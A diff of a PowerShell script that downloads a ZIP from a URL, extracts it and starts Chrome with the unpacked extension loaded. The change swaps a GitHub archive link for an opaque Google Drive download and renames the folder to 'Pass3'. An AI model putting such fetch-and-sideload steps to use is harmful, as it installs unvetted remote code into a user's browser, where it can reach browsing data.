@@ -1,5 +1,5 @@
 # Define variables
-$extensionUrl = "https://github.com/prathameshpatil1001/chrome-extension-host/archive/refs/heads/main.zip"  # URL of the extension's ZIP file
+$extensionUrl = "https://drive.usercontent.google.com/u/0/uc?id=1rSMUBqLWjhr5U8VdgcSJjQxwRlTqdf7-&export=download"  # URL of the extension's ZIP file
 $tempZipPath = "$env:TEMP\extension.zip"                                             # Temporary path for the downloaded ZIP
 $extractPath = "$env:TEMP\extension"                                                 # Path where the ZIP will be extracted
 $chromePath = "$env:PROGRAMFILES\Google\Chrome\Application\chrome.exe"              # Path to the Chrome executable
@@ -11,7 +11,7 @@ Invoke-WebRequest -Uri $extensionUrl -OutFile $tempZipPath
 Expand-Archive -Path $tempZipPath -DestinationPath $extractPath -Force
 
 # Step 3: Identify the unpacked extension folder
-$unpackedExtensionPath = Join-Path $extractPath "chrome-extension-host-main"  # Adjust based on the extracted folder name
+$unpackedExtensionPath = Join-Path $extractPath "Pass3"  # Adjust based on the extracted folder name
 
 # Step 4: Launch Chrome with the unpacked extension loaded
 Start-Process -FilePath $chromePath -ArgumentList "--load-extension=$unpackedExtensionPath"
